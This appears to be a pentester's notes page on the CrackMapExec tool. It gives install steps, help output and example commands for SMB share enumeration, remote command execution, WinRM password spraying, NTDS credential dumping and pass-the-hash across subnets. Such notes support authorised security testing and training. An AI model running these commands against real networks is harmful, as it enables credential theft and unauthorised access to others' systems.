---
tags:
  - Enumeration
  - TCP
  - ServerMessageBlock
  - SMB
  - Tooling
---


[GitHub - byt3bl33d3r/CrackMapExec: A swiss army knife for pentesting networks](https://github.com/byt3bl33d3r/CrackMapExec)


```shell-session
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```

## Installation

```shell-session
sudo apt-get -y install crackmapexec
```

## Usage

```shell-session
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

##### SMB Command Execution

```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
##### WinRM Password Spraying

```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

> [!NOTE]
> By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found.

[web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials)
##### Enumerating Logged-on Users

On a network with multiple machines. Some of them share the same local administrator account.

```shell-session
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

### Options

```shell-session
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT]
                    [--jitter INTERVAL] [--darrell]
                    [--verbose]
                    {mssql,smb,ssh,winrm} ...

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {mssql,smb,ssh,winrm}
    mssql               own stuff using MSSQL
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM
```


```shell-session
usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]]
                        [-k] [--aesKey] [--kdcHost] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT]
                        [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {http,https}]
                        [--server-host HOST] [--server-port PORT] [-H HASH [HASH ...]] [--no-bruteforce]
                        [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE] [--gen-relay-list OUTPUT_FILE]
                        [--continue-on-success] [--sam | --lsa | --ntds [{drsuapi,vss}]] [--shares] [--sessions]
                        [--disks] [--loggedon-users] [--users [USER]] [--groups [GROUP]] [--local-groups [GROUP]]
                        [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE]
                        [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
                        [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files]
                        [--put-file FILE FILE] [--get-file FILE FILE]
                        [--exec-method {atexec,wmiexec,smbexec,mmcexec}] [--force-ps32] [--no-output]
                        [-x COMMAND | -X PS_COMMAND] [--obfs] [--clear-obfscripts]
                        [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of
                        targets, NMap XML or .Nessus file(s)

optional arguments:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)
```

## Extract NTDS from SMB

Using an account with admin privileges:

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

## Pass the Hash


```shell-session
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. We can use the option `-x` to execute commands.